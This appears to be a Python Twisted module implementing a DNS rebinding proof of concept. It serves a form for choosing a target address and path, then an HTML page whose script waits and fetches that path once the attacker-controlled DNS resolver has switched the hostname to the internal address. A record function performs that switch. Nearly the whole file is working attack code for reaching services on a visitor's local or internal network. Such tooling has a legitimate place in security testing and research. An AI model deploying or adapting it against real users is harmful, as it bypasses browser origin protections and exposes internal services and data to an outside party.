import random
import time

from twisted.web.resource import Resource

html_instructions = """
<html>
<body>
  <b>Enter the timeout, address and path for the dnsrebind target:</b>
  <form action="#" onsubmit="onSubmit(); return false;">
    <label for="timeout">Timeout: </label><input type="text" cols=8 name="timeout" id="timeout" value="20" /><br />
    <label for="address">Address: </label><input type="text" cols=8 name="address" id="address" value="127.0.0.1" /><br />
    <label for="path">Path: </label><input type="text" cols=8 name="path" id="path" value="/" /><br />
    <input type="submit" />
  </form>
  <script>
  function onSubmit() {
    console.log("onSubmit");
    var timeout = document.getElementById("timeout").value;
    var address = document.getElementById("address").value;
    var path = document.getElementById("path").value.replace("/", "", 1);
    document.location = document.location + "get/" + timeout + "/" + address + "/" + path;
  }
  </script>
</body>
</html>
"""

html_rebind = """
<html>
<body>
  <h1>DNS Rebinding PoC - Rebinding to {rebind_address}</h1>
  <h2>Sending rebind request in <span id="counter">{rebind_timeout}</span> seconds</h2>
  <pre>Preview of {rebind_scheme}://{rebind_address}:{rebind_port}/{rebind_querystring}:</pre>
  <iframe src="{rebind_preview}" width="100%"></iframe>
  <div id="log"></div>
  <script>
var rebindTimer = {rebind_timeout};
var rebindPath = "/{rebind_querystring}";

function log(msg) {
  var text = document.createTextNode(msg);
  var pre = document.createElement("pre");
  pre.setAttribute("style", "white-space: pre-wrap;");
  pre.appendChild(text);
  document.getElementById("log").appendChild(pre);
}

function countdown() {
  var interval;
  var counter = rebindTimer;

  function step() {
    counter -= 1;
    document.getElementById("counter").innerHTML = counter;
    if (counter == 0) {
      clearInterval(interval)
      run()
    }
  }
  interval = setInterval(function(){ step() }, 1000);
}

async function run() {
  try {
    var resp = await fetch(rebindPath)
      .then((response) => response.text())
      .catch((error) => error);

    log("Contents of {rebind_scheme}://{rebind_address}:{rebind_port}/{rebind_querystring}:");
    log(resp);
  }
  catch(e) {
    log("Retrying...");
    countdown();
  }
}

countdown();
  </script>
</body>
</html>
"""

rebind_mappings = {}

class RebindPage(Resource):
    isLeaf = True

    def render_GET(self, request):
        print("render_GET called", request.path)
        domain = request.getRequestHostname().decode()
        port = str(request.getHost().port)
        path = request.path.decode()
        scheme = "https" if request.isSecure() else "http"

        if path.startswith("/reset"):
            rebind_mappings.clear()
            request.setResponseCode(302)
            request.setHeader("Location", "/")
            request.setHeader("Content-Type", "text/html; charset=UTF-8")
            return "Redirecting...".encode()

        elif path.startswith("/get/"):
            timeout, address, querystring = (path.split("/get/")[1].split("/", 2) + [""])[0:3]

            # No rebind tag set, generate one and redirect
            if domain.startswith("dnsrebind"):
                rebindtag = "".join(random.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(6))
                location = "{}://t{}.{}:{}/get/{}/{}/{}".format(scheme, rebindtag, domain, port, timeout, address, querystring)

                request.setResponseCode(302)
                request.setHeader("Location", location)
                request.setHeader("Content-Type", "text/html; charset=UTF-8")
                return "Redirecting...".encode()

            # Setup the rebind mapping
            rebindtag = domain.split(".dnsrebind.")[0][1:]
            rebind_mappings[rebindtag] = {}
            rebind_mappings[rebindtag]["address"] = address
            rebind_mappings[rebindtag]["time"] = time.time() + 2

            html = html_rebind
            html = html.replace("{rebind_timeout}", timeout)
            html = html.replace("{rebind_address}", address)
            html = html.replace("{rebind_scheme}", scheme)
            html = html.replace("{rebind_port}", port)
            html = html.replace("{rebind_preview}", "{}://p{}:{}/{}".format(scheme, domain[1:], port, querystring))
            html = html.replace("{rebind_querystring}", querystring)
            return html.encode()

        return html_instructions.encode()


def get_record(lookup_name, lookup_cls, lookup_type):
    rebindtag = lookup_name.decode().split(".dnsrebind.")[0]
    preview = rebindtag[0] == "p"
    rebindtag = rebindtag[1:]

    if rebindtag in rebind_mappings:
        if preview or rebind_mappings[rebindtag]["time"] < time.time():
            return rebind_mappings[rebindtag]["address"]

    return "{ipv4}"


def get_resource(request):
    return RebindPage()
